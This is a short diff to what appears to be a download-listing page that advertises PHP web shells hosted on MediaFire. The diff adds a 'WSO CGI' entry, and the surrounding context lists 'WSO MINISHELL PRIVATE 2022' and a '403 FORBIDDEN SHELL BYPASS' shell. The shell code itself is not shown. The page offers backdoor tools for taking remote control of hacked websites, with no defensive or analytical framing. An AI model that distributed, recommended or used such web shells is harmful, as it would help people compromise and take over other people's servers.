@@ -329,6 +329,9 @@ Date : 10 January 2023
 	
 # <a href="https://www.mediafire.com/file/ef2eouclw5imwgs/wso-mini.php/file">WSO MINISHELL PRIVATE 2022</a> 
 <img src="https://i.imgur.com/fkAWBaB.png" alt="beruangsalju profile">
+
+# <a href="https://www.mediafire.com/file/84y52s1s45xmued/wsocgi.php/file">WSO CGI</a> 
+<img src="https://i.imgur.com/WO0hYd6.png" alt="beruangsalju profile">
 	
 # <a href="https://www.mediafire.com/file/uc6b2sx6zw3ciar/403.php/file">403 FORBIDDEN SHELL BYPASS</a> 
 <img src="https://i.imgur.com/nsKzWeb.jpg" alt="beruangsalju profile">
